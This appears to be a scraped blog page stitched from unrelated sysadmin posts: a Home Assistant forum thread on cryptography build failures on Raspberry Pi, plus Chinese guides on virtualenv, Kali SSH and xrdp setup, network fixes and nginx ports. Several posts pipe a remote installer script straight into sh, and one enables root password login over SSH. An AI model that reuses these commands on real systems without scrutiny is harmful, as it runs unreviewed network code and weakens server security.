src/cryptography/hazmat/bindings/_rust/x509.pyi -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/bindings/_rust</span><br><span class="line">  running build_ext</span><br><span class="line">  running build_rust</span><br><span class="line">      Updating crates.io index</span><br><span class="line"></span><br><span class="line">      =============================DEBUG ASSISTANCE=============================</span><br><span class="line">      If you are seeing a compilation error please try the following steps to</span><br><span class="line">      successfully install cryptography:</span><br><span class="line">      1) Upgrade to the latest pip and try again. This will fix errors for most</span><br><span class="line">         users. See: https://pip.pypa.io/en/stable/installing/#upgrading-pip</span><br><span class="line">      2) Read https://cryptography.io/en/latest/installation/ for specific</span><br><span class="line">         instructions for your platform.</span><br><span class="line">      3) Check our frequently asked questions for more information:</span><br><span class="line">         https://cryptography.io/en/latest/faq/</span><br><span class="line">      4) Ensure you have a recent Rust toolchain installed:</span><br><span class="line">         https://cryptography.io/en/latest/installation/#rust</span><br><span class="line"></span><br><span class="line">      Python: 3.8.5</span><br><span class="line">      platform: Linux-5.10.63-v7+-armv7l-with-glibc2.28</span><br><span class="line">      pip: n/a</span><br><span class="line">      setuptools: 59.6.0</span><br><span class="line">      setuptools_rust: 1.1.2</span><br><span class="line">      =============================DEBUG ASSISTANCE=========================</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File &quot;/srv/homeassistant/lib/python3.8/site-packages/pip/_vendor/pep517/in_process/_in_process.py&quot;, line 363, in &lt;module&gt;</span><br><span class="line">      main()</span><br><span class="line">    File &quot;/srv/homeassistant/lib/python3.8/site-packages/pip/_vendor/pep517/in_process/_in_process.py&quot;, line 345, in main</span><br><span class="line">      json_out[&#x27;return_val&#x27;] = hook(**hook_input[&#x27;kwargs&#x27;])</span><br><span class="line">    File &quot;/srv/homeassistant/lib/python3.8/site-packages/pip/_vendor/pep517/in_process/_in_process.py&quot;, line 261, in build_wheel</span><br><span class="line">      return _build_backend().build_wheel(wheel_directory, config_settings,</span><br><span class="line">    File &quot;/tmp/pip-build-env-wtu1ut7k/overlay/lib/python3.8/site-packages/setuptools/build_meta.py&quot;, line 230, in build_wheel</span><br><span class="line">      return self._build_with_temp_dir([&#x27;bdist_wheel&#x27;], &#x27;.whl&#x27;,</span><br><span class="line">    File &quot;/tmp/pip-build-env-wtu1ut7k/overlay/lib/python3.8/site-packages/setuptools/build_meta.py&quot;, line 215, in _build_with_temp_dir</span><br><span class="line">      self.run_setup()</span><br><span class="line">    File &quot;/tmp/pip-build-env-wtu1ut7k/overlay/lib/python3.8/site-packages/setuptools/build_meta.py&quot;, line 158, in run_setup</span><br><span class="line">      exec(compile(code, __file__, &#x27;exec&#x27;), locals())</span><br><span class="line">    File &quot;setup.py&quot;, line 39, in &lt;module&gt;</span><br><span class="line">      setup(</span><br><span class="line">    File &quot;/tmp/pip-build-env-wtu1ut7k/overlay/lib/python3.8/site-packages/setuptools/__init__.py&quot;, line 153, in setup</span><br><span class="line">      return distutils.core.setup(**attrs)</span><br><span class="line">    File &quot;/usr/local/lib/python3.8/distutils/core.py&quot;, line 148, in setup</span><br><span class="line">      dist.run_commands()</span><br><span class="line">    File &quot;/usr/local/lib/python3.8/distutils/dist.py&quot;, line 966, in run_commands</span><br><span class="line">      self.run_command(cmd)</span><br><span class="line">    File &quot;/usr/local/lib/python3.8/distutils/dist.py&quot;, line 985, in run_command</span><br><span class="line">      cmd_obj.run()</span><br><span class="line">    File &quot;/tmp/pip-build-env-wtu1ut7k/overlay/lib/python3.8/site-packages/wheel/bdist_wheel.py&quot;, line 299, in run</span><br><span class="line">      self.run_command(&#x27;build&#x27;)</span><br><span class="line">    File &quot;/usr/local/lib/python3.8/distutils/cmd.py&quot;, line 313, in run_command</span><br><span class="line">      self.distribution.run_command(command)</span><br><span class="line">    File &quot;/usr/local/lib/python3.8/distutils/dist.py&quot;, line 985, in run_command</span><br><span class="line">      cmd_obj.run()</span><br><span class="line">    File &quot;/usr/local/lib/python3.8/distutils/command/build.py&quot;, line 135, in run</span><br><span class="line">      self.run_command(cmd_name)</span><br><span class="line">    File &quot;/usr/local/lib/python3.8/distutils/cmd.py&quot;, line 313, in run_command</span><br><span class="line">      self.distribution.run_command(command)</span><br><span class="line">    File &quot;/usr/local/lib/python3.8/distutils/dist.py&quot;, line 985, in run_command</span><br><span class="line">      cmd_obj.run()</span><br><span class="line">    File &quot;/tmp/pip-build-env-wtu1ut7k/overlay/lib/python3.8/site-packages/setuptools_rust/setuptools_ext.py&quot;, line 132, in run</span><br><span class="line">      build_rust.run()</span><br><span class="line">    File &quot;/tmp/pip-build-env-wtu1ut7k/overlay/lib/python3.8/site-packages/setuptools_rust/command.py&quot;, line 101, in run</span><br><span class="line">      self.run_for_extension(ext)</span><br><span class="line">    File &quot;/tmp/pip-build-env-wtu1ut7k/overlay/lib/python3.8/site-packages/setuptools_rust/build.py&quot;, line 108, in run_for_extension</span><br><span class="line">      dylib_paths = self.build_extension(ext, self.target)</span><br><span class="line">    File &quot;/tmp/pip-build-env-wtu1ut7k/overlay/lib/python3.8/site-packages/setuptools_rust/build.py&quot;, line 139, in build_extension</span><br><span class="line">      target_dir = _base_cargo_target_dir(ext)</span><br><span class="line">    File &quot;/tmp/pip-build-env-wtu1ut7k/overlay/lib/python3.8/site-packages/setuptools_rust/build.py&quot;, line 673, in _base_cargo_target_dir</span><br><span class="line">      target_directory = ext._metadata()[&quot;target_directory&quot;]</span><br><span class="line">    File &quot;/tmp/pip-build-env-wtu1ut7k/overlay/lib/python3.8/site-packages/setuptools_rust/extension.py&quot;, line 200, in _metadata</span><br><span class="line">      self._cargo_metadata = json.loads(subprocess.check_output(metadata_command))</span><br><span class="line">    File &quot;/usr/local/lib/python3.8/subprocess.py&quot;, line 411, in check_output</span><br><span class="line">      return run(*popenargs, stdout=PIPE, timeout=timeout, check=True,</span><br><span class="line">    File &quot;/usr/local/lib/python3.8/subprocess.py&quot;, line 512, in run</span><br><span class="line">      raise CalledProcessError(retcode, process.args,</span><br><span class="line">  subprocess.CalledProcessError: Command &#x27;[&#x27;cargo&#x27;, &#x27;metadata&#x27;, &#x27;--manifest-path&#x27;, &#x27;src/rust/Cargo.toml&#x27;, &#x27;--format-version&#x27;, &#x27;1&#x27;]&#x27; died with &lt;Signals.SIGSEGV: 11&gt;.</span><br><span class="line">  ----------------------------------------</span><br><span class="line">  ERROR: Failed building wheel for cryptography</span><br><span class="line">Failed to build cryptography</span><br><span class="line">ERROR: Could not build wheels for cryptography, which is required to install pyproject.toml-based projects</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://community.home-assistant.io/u/koying">koying</a> (Chris B)December 18, 2021, 9:38am#10</p>
<p>The export trick doesn’t work anymore in 2021.12, due to “cryptography” being bumped to 3.5.<br>That did the trick for me, i.e. installing a newer rust/cargo from origin.</p>
<p><img src="https://community.home-assistant.io/user_avatar/community.home-assistant.io/garlandkr/40/158085_2.png" alt="img"> <a target="_blank" rel="noopener" href="https://community.home-assistant.io/t/cant-update-ha-to-the-latest-version/345605/5">Can’t update HA to the latest version</a> <a target="_blank" rel="noopener" href="https://community.home-assistant.io/c/installation/17">Installation</a></p>
<blockquote>
<p>I also experienced this issue when trying to upgrade hass core, however when trying to install cargo I got an error of E: Package ‘cargo’ has no installation candidate to solve this I did the following: sudo apt remove rustc curl <a target="_blank" rel="noopener" href="https://sh.rustup.rs/">https://sh.rustup.rs</a> -sSf | sh This installed rust and cargo on my Rpi4 running RaspberryPi 10 (Buster). Just leaving this here for anyone else that encounters the issue on Raspian. Make sure to run the curl command as the user who is running home-assistant.</p>
</blockquote>
<p>1 Like</p>
<p><a target="_blank" rel="noopener" href="https://community.home-assistant.io/u/Rudhan">Rudhan</a> (Tomas Rudh)December 18, 2021, 12:22pm#11</p>
<p>Excellent, that worked. To clarify, these are the commands I ran:<br>sudo apt remove rustc<br>sudo curl <a target="_blank" rel="noopener" href="https://sh.rustup.rs/">https://sh.rustup.rs</a> -sSf | sh</p>
<p>Thanks so much!</p>
<p>1 Like</p>
<p><a target="_blank" rel="noopener" href="https://community.home-assistant.io/u/seventh">seventh</a> (Dima)December 24, 2021, 6:12am#12</p>
<p>Same problem even after upgrade rust. My <a target="_blank" rel="noopener" href="https://pastebin.com/iFN2krNn">log</a>.<br>rustc 1.57.0</p>
<p><a target="_blank" rel="noopener" href="https://community.home-assistant.io/u/Martor">Martor</a> (Martin)December 29, 2021, 11:46pm#13</p>
<p>Hi,</p>
<p>for armv7 during the cargo and rustc installation</p>
<blockquote>
<p>curl <a target="_blank" rel="noopener" href="https://sh.rustup.rs/">https://sh.rustup.rs </a>-sSf | sh</p>
</blockquote>
<p>please first select option 2 and chage it to “armv7-unknown-linux-gnueabihf”, rest just enter defaults and then select option 1 and install. After that type:</p>
<blockquote>
<p>source $HOME/.cargo/env</p>
</blockquote>
<p>To double check if it is ok, just type</p>
<blockquote>
<p>rustc – version</p>
</blockquote>
<p>to see if it is OK.</p>
<p>Then run again installation of HA and the Cryptography should be properly built.</p>
<p>Good luck <img src="https://community.home-assistant.io/images/emoji/twitter/wink.png?v=10" alt=":wink:"></p>
<p>P.S. be sure to unistall previous version via:</p>
<blockquote>
<p>sudo apt remove rustc cargo</p>
</blockquote>
<p>If you need to unistall previous cargo and rustc, use:</p>
<blockquote>
<p>rustup self uninstall</p>
</blockquote>
<p>2 Likes</p>
<p><a target="_blank" rel="noopener" href="https://community.home-assistant.io/u/britiger">britiger</a> (Christopher)December 30, 2021, 3:27pm#14</p>
<p>Hi,</p>
<p>I found a workaround on one the debian bug reports. I seams to be a second bug with rust and git. If I set the following variables I was able to install the required cryptography 35.0.0 package:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CRYPTOGRAPHY_DONT_BUILD_RUST=1</span><br><span class="line"><span class="built_in">export</span> CARGO_NET_GIT_FETCH_WITH_CLI=<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>Christopher</p>
<p><a target="_blank" rel="noopener" href="https://community.home-assistant.io/u/Piotr_Kowalski">Piotr_Kowalski</a> (Piotr Kowalski)December 30, 2021, 5:54pm#15</p>
<p>Hi, should I update Rust in pip env or in my main account? I updated as a root user but in pip env HA says me: error: can’t find Rust compiler</p>
<p>EDIT<br>Helped me adding<br><code>export PATH=$PATH:~/.cargo/bin</code><br>after instalation of Rush from<br><code>curl [https://sh.rustup.rs](https://sh.rustup.rs/) -sSf | sh</code></p>
<p><a target="_blank" rel="noopener" href="https://community.home-assistant.io/u/mike3">mike3</a>January 3, 2022, 1:35am#16</p>
<p>This did it for me! Running<br><code>rustup self uninstall</code><br>first was important.</p>
<p>I’m on a raspberry pi. To make sure I was on an ARMv7 processor architecture I ran:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/cpuinfo</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://community.home-assistant.io/">Home</a> <a target="_blank" rel="noopener" href="https://community.home-assistant.io/categories">Categories</a> <a target="_blank" rel="noopener" href="https://community.home-assistant.io/guidelines">FAQ/Guidelines</a> <a target="_blank" rel="noopener" href="https://community.home-assistant.io/tos">Terms of Service</a> <a target="_blank" rel="noopener" href="https://community.home-assistant.io/privacy">Privacy Policy</a></p>
<h2 id="linux在python的虚拟环境下运行程序-安装python虚拟运行环境，linux下轻松切换python2和python3…"><a href="#linux在python的虚拟环境下运行程序-安装python虚拟运行环境，linux下轻松切换python2和python3…" class="headerlink" title="linux在python的虚拟环境下运行程序_安装python虚拟运行环境，linux下轻松切换python2和python3…"></a>linux在python的虚拟环境下运行程序_安装python虚拟运行环境，linux下轻松切换python2和python3…</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39959615">weixin_39959615</a><img src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCurrentTime2.png" alt="img">于 2020-11-20 18:10:42 发布<img src="https://csdnimg.cn/release/blogv2/dist/pc/img/articleReadEyes2.png" alt="img">78</p>
<p>文章标签： <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search/s.do?q=linux%E5%9C%A8python%E7%9A%84%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E4%B8%8B%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F&t=blog&o=vip&s=&l=&f=&viparticle=">linux在python的虚拟环境下运行程序</a></p>
<p>一、查询系统采用的python版本</p>
<p>$ python –version</p>
<p>Python 3.7.3</p>
<p>系统采用的python版本为3.7.3</p>
<p>以下查询py3和py2的目录：</p>
<p>$ which python3.7</p>
<p>/usr/bin/python3.7</p>
<p>$ which python2.7</p>
<p>/usr/bin/python2.7</p>
<p>二、安装python虚拟运行环境</p>
<p>pip安装</p>
<p>$ sudo pip install virtualenvwrapper</p>
<p>上述工具装好后，需要执行以下环境变量设置。</p>
<p>1.创建目录用来存放<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83&spm=1001.2101.3001.7020">虚拟环境</a></p>
<p>mkdir $HOME/.virtualenvs</p>
<p>2.在~/.bashrc中添加行：</p>
<p>export WORKON_HOME=$HOME/.virtualenvs</p>
<p>source /usr/bin/virtualenvwrapper.sh</p>
<p>3.运行:</p>
<p>source ~/.bashrc</p>
<p>三、创建python虚拟环境</p>
<p>当你需要使用Python2开发项目时，建立一个Python2的虚拟环境：</p>
<p>$ mkvirtualenv -p /usr/bin/python2.7 env27</p>
<p>当你需要Python3开发时：</p>
<p>$ mkvirtualenv -p /usr/bin/python3.7 env37</p>
<p>然后可以随时切换不同的虚拟环境：</p>
<p>$ workon env27 # 进入Python2环境</p>
<p>$ workon env37 # 进入Python3环境</p>
<p>不仅可以自由切换py2和py3，同一个版本下还可以配置不同的依赖，pip不同的包，来适应不同项目的需求。</p>
<p>更爽的是，你可以在进入虚拟环境的同时切换到项目目录，只需要编辑 $VIRTUAL_ENV/bin/postactivate 这个文件即可：</p>
<p>$ vim $VIRTUAL_ENV/bin/postactivate #前提是已经进入对应的虚拟环境</p>
<p>在文件中添加切换目录的命令：</p>
<p>cd /path/to/your/project</p>
<p>四、退出虚拟环境 离开 deactivate</p>
<h1 id="kali-linux-开启SSH服务-容许root登陆"><a href="#kali-linux-开启SSH服务-容许root登陆" class="headerlink" title="kali linux 开启SSH服务 容许root登陆"></a>kali linux 开启SSH服务 容许root登陆</h1><ol>
<li>查看ssh服务状态</li>
</ol>
<p>/etc/init.d/ssh status</p>
<p>2.修改配置文件</p>
<p>vim /etc/ssh/sshd_config</p>
<p>#PermitRootLogin prohibit-password<br>PermitRootLogin yes<br>#PasswordAuthentication yes<br>PasswordAuthentication yes</p>
<ol start="3">
<li>启动ssh服务</li>
</ol>
<p>/etc/init.d/ssh start</p>
<p>查看服务状态</p>
<p>/etc/init.d/ssh status</p>
<p>开机启动</p>
<p>update-rc.d ssh enable<br>参考：1.Kali Linux 2.0开启SSH服务 使用SSH进行远程访问</p>
<h1 id="kali-rpm-安装方法-Kali-Linux安装过程记录"><a href="#kali-rpm-安装方法-Kali-Linux安装过程记录" class="headerlink" title="kali rpm 安装方法_Kali Linux安装过程记录"></a>kali rpm 安装方法_Kali Linux安装过程记录</h1><p>Kali Linux是一款基于Debian Linux开发的用于用户渗透测试和安全审计的操作系统。</p>
<p>一、在Linux KVM虚拟机的安装过程如下：</p>
<ol>
<li><p>安装好KVM虚拟机</p>
</li>
<li><p>在kali官网下载最新镜像</p>
</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://www.kali.org/downloads/">https://www.kali.org/downloads/</a></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/5ac032b0121d87190339416a069e677b.png" alt="5ac032b0121d87190339416a069e677b.png"></p>
<p>\3. 新建新的KVM虚拟机，根据宿主机的配置选择合适的<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%86%85%E5%AD%98&spm=1001.2101.3001.7020">内存</a>和CPU设置，CD-ROM镜像选择下载的Kali Linux镜像，启动安装(根据向导步骤完成)</p>
<p>\4. 安装完成后，输入设定的用户名和密码(在向导过程中设定)， 进入系统界面</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/d2c0e50968d8e6353910988c6656aa89.png" alt="d2c0e50968d8e6353910988c6656aa89.png"></p>
<p>\5. 若需要对系统或网络设置，点击左侧工具栏中的，滚动页面，在页面中选择Settings, 在新的页面中，选中Network进行网络设置。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/64f52233aeacb905524621c43795fa01.png" alt="64f52233aeacb905524621c43795fa01.png"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/a280efbb9840a387ecf84c763b6bf4a2.png" alt="a280efbb9840a387ecf84c763b6bf4a2.png"></p>
<p>二、开启ssh远程登录</p>
<p>Kali Linux默认未启动ssh Server， 可在后台ssh服务。</p>
<p>\1. 进入Terminal, 开启并使能ssh服务</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/0c409481273df270efe7e0d8ce6c72a1.png" alt="0c409481273df270efe7e0d8ce6c72a1.png"></p>
<p>\2. 新增用户，作为ssh登录账户</p>
<p>Settings中选择Details, 选择Users, Add User</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/d00ee588d47bdbb67bb5a5d1a0413dfa.png" alt="d00ee588d47bdbb67bb5a5d1a0413dfa.png"></p>
<p>三、组件更新</p>
<p>新装系统未设置任何更新源，我们需要手动指定Kali系统的更新源</p>
<p>在/etc/apt/sources.list文件中增加新的更新源， 如：</p>
<p>deb <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/kali">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/1e1423db1d6d320a3efbfe3cdb2c0704.png" alt="1e1423db1d6d320a3efbfe3cdb2c0704.png"></p>
<p>主要的更新源有：</p>
<p>官网：</p>
<p>deb <a target="_blank" rel="noopener" href="http://http.kali.org/kali">http://http.kali.org/kali</a> kali-rolling main non-free contrib</p>
<p>deb-src <a target="_blank" rel="noopener" href="http://http.kali.org/kali">http://http.kali.org/kali</a> kali-rolling main non-free contrib</p>
<p>注意：官网的更新源在国外，一般情况下需要设置代理才能访问(有时候，由于中间防火墙的缘故，经常出现500 Internal Privoxy Error错误，导致更新失败)， 设置代理的方法和简单，在Terminal中执行如下命令即可：</p>
<p>export http_proxy=<a target="_blank" rel="noopener" href="http://192.168.1.123:8080/">http://192.168.1.123:8080/</a></p>
<p>export https_proxy=https:// 192.168.1.123:8080</p>
<p>国内镜像点：</p>
<p>#阿里云</p>
<p>deb <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/kali">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib</p>
<p>deb-src <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/kali">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib</p>
<p>#清华大学</p>
<p>deb <a target="_blank" rel="noopener" href="http://mirrors.tuna.tsinghua.edu.cn/kali">http://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free</p>
<p>deb-src <a target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/kali">https://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free</p>
<p>#浙大</p>
<p>deb <a target="_blank" rel="noopener" href="http://mirrors.zju.edu.cn/kali">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free</p>
<p>deb-src <a target="_blank" rel="noopener" href="http://mirrors.zju.edu.cn/kali">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free</p>
<p>#163</p>
<p>deb <a target="_blank" rel="noopener" href="http://mirrors.163.com/debian/">http://mirrors.163.com/debian/</a> jessie main non-free contrib</p>
<p>deb <a target="_blank" rel="noopener" href="http://mirrors.163.com/debian/">http://mirrors.163.com/debian/</a> jessie-updates main non-free contrib</p>
<p>设置镜像点后，执行更新(根据提示选择)</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/00024919bc03be1dde259f410c843366.png" alt="00024919bc03be1dde259f410c843366.png"></p>
<p>三、安装远程桌面</p>
<p>XRDP支持远程桌面连接。</p>
<p>apt install xrdp</p>
<p>按照提示完成安装，完成后，启用服务：</p>
<p>systemctl enable xrdp</p>
<p>systemctl start xrdp</p>
<p>完成后，通过netstat检查3350端口是否监听</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/c6a505318e4cff32121e85f18e9c852d.png" alt="c6a505318e4cff32121e85f18e9c852d.png"></p>
<p>Windows 10系统共同远程桌面，连接Kali Linux,如下图所示：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/be7ae1ceed3a2f03bc9c95a4a239dc38.png" alt="be7ae1ceed3a2f03bc9c95a4a239dc38.png"></p>
<h1 id="kali无法连接网络"><a href="#kali无法连接网络" class="headerlink" title="kali无法连接网络"></a>kali无法连接网络</h1><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/u/c6d743ce7424"><img src="https://upload.jianshu.io/users/upload_avatars/13348817/d494b761-7b33-4f1f-be05-732322fe6486.jpg?imageMogr2/auto-orient/strip%7CimageView2/1/w/96/h/96/format/webp" alt="img"></a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/u/c6d743ce7424">HAPPYers</a>关注</p>
<p>查看ifconfig -a，发现eth0存在，但是没有工作</p>
<p>打开/etc/network/interfaces，起初是没有最下面两行的，加上，格式是仿造倒数第三和第四这两行来写的<br>在行末加入</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> eth0</span><br><span class="line">iface eth0 inet dhcp</span><br></pre></td></tr></table></figure>

<p>文本如下</p>
<p><img src="https://upload-images.jianshu.io/upload_images/13348817-d7d5104c29fab0e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/690/format/webp" alt="img"></p>
<p>最后，在terminal里执行 /etc/init.d/networking restart 重启网络，使刚才的配置生效，done。</p>
<p>windows 远程桌面访问kali 之xrdp</p>
<p>qq_19486585</p>
<p>于 2020-11-17 14:30:27 发布</p>
<p>2106<br>文章标签： 经验分享 其他<br>版权<br>环境：Esxi6.5</p>
<pre><code>   kali2020.3虚拟机和靶机
   windows:虚拟机或物理机
   同一lan内
</code></pre>
<p>1<br>2<br>3<br>系统：</p>
<pre><code>1）kali 2020.3
2）windows 10 v20h2
</code></pre>
<p>1<br>2<br>一、Kali配置</p>
<p>安装软件<br>#apt-get install xrdp<br>安装xrdp时，提示“无法定位软件包 xrdp”时。更换一下镜像源<br>#vim /etc/apt/source.list</p>
<p><img src="https://img-blog.csdnimg.cn/20201117135919123.png#pic_center" alt="在这里插入图片描述"></p>
<p>#apt-get install xfce4</p>
<p>编辑配置文件<br>#vim /etc/xrdp/xrdp.ini<br>max_bpp=32 修改为16<br>[Xvnc]栏<br>ip=0.0.0.0</p>
<p>#vim /etc/xrdp/startwm.sh<br>添加下图红框一条配置</p>
<p><img src="https://img-blog.csdnimg.cn/20201117135454580.png#pic_center" alt="在这里插入图片描述"></p>
<p>启动<br>#service xrdp restart<br>#update-rc.d xrdp enable</p>
<p>二、windows 10远程访问<br>运行mstsc—–kali的ip地址<br>session使用xorg服务， 也可以安装VNC服务器登录但我没安装vnc；<br>输入root账号和密码， 经测试非root账号会闪退；</p>
<p><strong><img src="https://img-blog.csdnimg.cn/20201117141741969.png#pic_center" alt="在这里插入图片描述"></strong></p>
<p><img src="https://img-blog.csdnimg.cn/20201117141827414.png#pic_center" alt="在这里插入图片描述"></p>
<h1 id="对Kali-Linux进行SSH远程控制"><a href="#对Kali-Linux进行SSH远程控制" class="headerlink" title="对Kali Linux进行SSH远程控制"></a>对Kali Linux进行SSH远程控制</h1><p>默认情况下，Kali Linux2并没有开始SSH服务，如果要远程使用SSH服务连接到Kali还需要一定的设置。</p>
<p>1、首先打开SSH所在目录，命令如下：</p>
<p>cd /etc/ssh/</p>
<p>2、在这个文件夹中创建一个备份文件夹keys_backup，用来保存默认的密钥：</p>
<p>mkdir keys_backup</p>
<p>3、使用如下命令将默认的密钥移动到keys_backup文件夹中。</p>
<p>mv ssh_host_* keys_backup</p>
<p>4、使用如下命令重新创建一个新的密钥。</p>
<p>dpkg-reconfigure openssh-server</p>
<p><img src="https://img-blog.csdnimg.cn/20190527001528877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>5、修改sshd_config文件，该文件位于/etc/ssh/sshd_config，如下图：</p>
<p>gedit sshd_config</p>
<p><img src="https://img-blog.csdnimg.cn/20190527001838540.png" alt="在这里插入图片描述"></p>
<p>6、接下来，在终端启动SSH服务，命令如下：</p>
<p>/etc/init.d/ssh start</p>
<p><img src="https://img-blog.csdnimg.cn/2019052700194696.png" alt="在这里插入图片描述"></p>
<p>如果像查看SSH服务运行状态，可以使用如下命令：</p>
<p>netstat -antp</p>
<p><img src="https://img-blog.csdnimg.cn/20190527002127279.png" alt="在这里插入图片描述"></p>
<p>可以看到SSH服务已经在22端口上运行起来了。</p>
<p>7、查看自己kali的ip地址。</p>
<p>ifconfig</p>
<p><img src="https://img-blog.csdnimg.cn/2019052700235545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>8、最后可以使用PuTTY来完成远程登陆。</p>
<p><img src="https://img-blog.csdnimg.cn/20190527002556995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>输入账号和密码后即可远程控制你的kali，如下：</p>
<p><img src="https://img-blog.csdnimg.cn/20190527002459885.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="解决kali无法连接网络问题"><a href="#解决kali无法连接网络问题" class="headerlink" title="解决kali无法连接网络问题"></a>解决kali无法连接网络问题</h1><p><img src="https://csdnimg.cn/release/blogv2/dist/pc/img/translate.png" alt="img"></p>
<ol>
<li>键入 ifconfig -a 查看网卡 ，是否存在</li>
<li>键入 leafpad /etc/network/interfaces 查看其中是否有如下语句，没有添加上即可：<br>auto eth0<br>iface eth0 inet <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=dhcp&spm=1001.2101.3001.7020">dhcp</a></li>
<li>然后重启：/etc/init.d/networking restart</li>
<li>如果仍无法连接网络，重置虚拟网络：编辑–虚拟网络编辑器</li>
<li>键入 leafpad /etc/NetworkManager/NetworkManager.conf 将其中的false改为true</li>
<li>键入ifup eth0 启动网卡</li>
</ol>
<h1 id="更改nginx默认端口，ubuntu更改nginx端口号"><a href="#更改nginx默认端口，ubuntu更改nginx端口号" class="headerlink" title="更改nginx默认端口，ubuntu更改nginx端口号"></a>更改nginx默认端口，ubuntu更改nginx端口号</h1><p>我们都知道nginx 默认使用80端口，有时候我们希望nginx运行在其他端口，就需要更改nginx配置<br>nginx配置文件在/etc/nginx目录下的nginx.conf。在nginx.conf-&gt;http选项末尾有引入两个目录下的文件分别为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">        #   省略部分内容    </span><br><span class="line">        include /etc/nginx/conf.d/*.conf;</span><br><span class="line">        include /etc/nginx/sites-enabled/*;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们查看/etc/nginx/sites-enabled/目录，会找到一个default文件，在server选项下前两行就可以找到使用的80端口号：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 80 default_server;</span><br><span class="line">        listen [::]:80 default_server;</span><br></pre></td></tr></table></figure>

<p>将80端口号改为想使用的端口号，保存文件，如果没有启动nginx，启动即可。如果nginx已经在运行，重新加载即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx start #运行nginx</span><br><span class="line">sudo nginx -s reload #重启nginx</span><br></pre></td></tr></table></figure>

<p>如果遇到nginx报以下错误：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx: [error] open() &quot;/run/nginx.pid&quot; failed (2: No such file or directory)</span><br></pre></td></tr></table></figure>

<p>sudo nginx -c path/.conf #指定nginx配置.conf的位置</p>
<p>查看nginx运行端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netstat -anp | grep nginx</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
